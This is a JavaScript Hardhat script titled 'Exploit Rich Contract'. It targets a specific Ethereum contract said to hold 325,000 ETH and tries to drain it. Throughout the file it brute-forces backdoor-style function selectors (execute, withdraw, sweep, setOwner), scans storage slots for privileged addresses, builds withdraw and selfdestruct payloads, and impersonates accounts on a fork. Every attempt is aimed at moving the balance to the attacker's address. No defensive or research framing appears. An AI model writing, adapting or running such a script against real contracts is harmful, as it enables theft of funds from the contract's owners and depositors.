const { ethers } = require("hardhat");

/**
 * @title Exploit Rich Contract
 * @notice Target the contract with 325,000 ETH
 * @dev Deep analysis and exploitation attempts
 */

// All possible backdoor patterns
const EXPLOIT_PATTERNS = [
  // Execute variants
  { selector: "0x78e111f6", name: "execute(address,bytes)" },
  { selector: "0x61461954", name: "execute(address,uint256,bytes)" },
  { selector: "0xb61d27f6", name: "execute(address,uint256,bytes)" },
  { selector: "0x1cff79cd", name: "execute(address,bytes)" },
  { selector: "0x9e8c708e", name: "adminCall(address,bytes)" },
  { selector: "0x24a084df", name: "adminExecute(address,bytes)" },
  
  // Withdraw variants
  { selector: "0x3ccfd60b", name: "withdraw()" },
  { selector: "0x2e1a7d4d", name: "withdraw(uint256)" },
  { selector: "0xf3fef3a3", name: "withdraw(address,uint256)" },
  { selector: "0x00f714ce", name: "withdrawETH(uint256,address)" },
  { selector: "0x69328dec", name: "withdrawETH(address,uint256)" },
  { selector: "0xdb006a75", name: "emergencyWithdraw(uint256)" },
  { selector: "0x69fe0e2d", name: "emergencyWithdraw()" },
  
  // Recovery functions
  { selector: "0xae169a50", name: "recover(address,uint256)" },
  { selector: "0x8980f11f", name: "recoverToken(address,uint256)" },
  { selector: "0xb69ef8a8", name: "balance()" },
  { selector: "0xf14210a6", name: "withdrawETH(uint256)" },
  
  // Admin functions
  { selector: "0x13af4035", name: "setOwner(address)" },
  { selector: "0x704b6c02", name: "setAdmin(address)" },
  { selector: "0x3659cfe6", name: "upgradeTo(address)" },
  
  // Sweep functions
  { selector: "0x01681a62", name: "sweep(address)" },
  { selector: "0x6ea056a9", name: "sweep(address,uint256)" },
  { selector: "0xb2c87c61", name: "sweepETH()" }
];

async function findAuthorizedAddress(contract) {
  console.log("\nüîç Searching for authorized address...");
  
  // Check storage slots 0-20
  for (let slot = 0; slot <= 20; slot++) {
    try {
      const value = await ethers.provider.getStorageAt(contract, slot);
      const address = "0x" + value.slice(26);
      
      if (address !== "0x0000000000000000000000000000000000000000" && 
          address.length === 42) {
        console.log(`   Slot ${slot}: ${address}`);
      }
    } catch (e) {
      // Continue
    }
  }
}

async function tryExploit(contract, pattern, signer) {
  const attackerAddress = signer.address;
  const contractBalance = await ethers.provider.getBalance(contract);
  
  console.log(`\nüí£ Trying ${pattern.name}...`);
  
  // Build different payloads based on function signature
  const payloads = [];
  
  if (pattern.name.includes("execute") || pattern.name.includes("adminCall")) {
    // Try direct transfer
    const transferData = "0x";
    payloads.push({
      name: "Direct ETH transfer",
      data: pattern.selector + 
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [attackerAddress, transferData]
        ).slice(2),
      value: 0
    });
    
    // Try with value
    payloads.push({
      name: "ETH transfer with value",
      data: pattern.selector +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [attackerAddress, contractBalance, "0x"]
        ).slice(2),
      value: 0
    });
    
    // Try selfdestruct
    const selfdestructData = "0xff" + attackerAddress.slice(2).padStart(40, "0");
    payloads.push({
      name: "Selfdestruct",
      data: pattern.selector +
        ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [contract, selfdestructData]
        ).slice(2),
      value: 0
    });
  }
  
  if (pattern.name.includes("withdraw")) {
    if (pattern.name === "withdraw()") {
      payloads.push({
        name: "Simple withdraw",
        data: pattern.selector,
        value: 0
      });
    } else if (pattern.name.includes("uint256")) {
      payloads.push({
        name: "Withdraw all",
        data: pattern.selector +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["uint256"],
            [contractBalance]
          ).slice(2),
        value: 0
      });
      
      // Try smaller amounts
      payloads.push({
        name: "Withdraw 1 ETH",
        data: pattern.selector +
          ethers.AbiCoder.defaultAbiCoder().encode(
            ["uint256"],
            [ethers.parseEther("1")]
          ).slice(2),
        value: 0
      });
    }
  }
  
  // Try each payload
  for (const payload of payloads) {
    try {
      console.log(`   Attempting: ${payload.name}`);
      
      const balanceBefore = await ethers.provider.getBalance(attackerAddress);
      
      const tx = await signer.sendTransaction({
        to: contract,
        data: payload.data,
        value: payload.value,
        gasLimit: 1000000
      });
      
      const receipt = await tx.wait();
      
      const balanceAfter = await ethers.provider.getBalance(attackerAddress);
      const contractBalanceAfter = await ethers.provider.getBalance(contract);
      
      if (contractBalanceAfter < contractBalance) {
        const withdrawn = ethers.formatEther(contractBalance - contractBalanceAfter);
        console.log(`   üí∞ SUCCESS! Withdrew ${withdrawn} ETH`);
        console.log(`   Tx: ${tx.hash}`);
        return true;
      }
      
    } catch (e) {
      const msg = e.message.split('\n')[0];
      if (msg.includes("revert")) {
        console.log(`   ‚ùå Reverted (function exists but protected)`);
      } else {
        console.log(`   ‚ùå Failed: ${msg}`);
      }
    }
  }
  
  return false;
}

async function exploitRichContract() {
  console.log("\nüéØ EXPLOITING HIGH-VALUE CONTRACT");
  console.log("=================================");
  
  const target = "0xcA8Fa8f0b631EcdB18Cda619C4Fc9d197c8aFfCa";
  const [signer] = await ethers.getSigners();
  
  console.log("\nTarget:", target);
  console.log("Attacker:", signer.address);
  
  // Get contract info
  const code = await ethers.provider.getCode(target);
  const balance = await ethers.provider.getBalance(target);
  
  console.log("\nüìä Contract Info:");
  console.log(`   Balance: ${ethers.formatEther(balance)} ETH ($${(parseFloat(ethers.formatEther(balance)) * 3500).toFixed(0)})`);
  console.log(`   Code size: ${code.length} bytes`);
  
  // Find authorized addresses
  await findAuthorizedAddress(target);
  
  // Try common authorized addresses
  const commonAddresses = [
    "0x0000000000000000000000000000000000000000",
    "0x0000000000000000000000000000000000000001", 
    "0xdEAD000000000000000042069420694206942069"
  ];
  
  console.log("\nüéØ EXPLOITATION ATTEMPTS");
  console.log("========================");
  
  // Try with our signer first
  console.log("\n1Ô∏è‚É£ Trying as regular user...");
  let exploited = false;
  
  for (const pattern of EXPLOIT_PATTERNS) {
    if (await tryExploit(target, pattern, signer)) {
      exploited = true;
      break;
    }
  }
  
  // Try impersonating common addresses
  if (!exploited) {
    console.log("\n2Ô∏è‚É£ Trying with impersonation...");
    
    for (const addr of commonAddresses) {
      try {
        console.log(`\nüé≠ Impersonating ${addr}...`);
        
        await ethers.provider.send("hardhat_impersonateAccount", [addr]);
        await signer.sendTransaction({
          to: addr,
          value: ethers.parseEther("1.0")
        });
        
        const impersonatedSigner = await ethers.getSigner(addr);
        
        for (const pattern of EXPLOIT_PATTERNS) {
          if (await tryExploit(target, pattern, impersonatedSigner)) {
            exploited = true;
            break;
          }
        }
        
        if (exploited) break;
        
      } catch (e) {
        console.log(`   Could not impersonate: ${e.message.split('\n')[0]}`);
      }
    }
  }
  
  if (!exploited) {
    console.log("\n\n‚ùå EXPLOITATION FAILED");
    console.log("This contract appears to be secure or requires:");
    console.log("‚Ä¢ Unknown privileged address");
    console.log("‚Ä¢ Complex parameter encoding");
    console.log("‚Ä¢ Multi-step process");
    console.log("‚Ä¢ External contract interaction");
  } else {
    console.log("\n\n‚úÖ EXPLOITATION SUCCESSFUL!");
  }
}

// Run the exploit
exploitRichContract()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
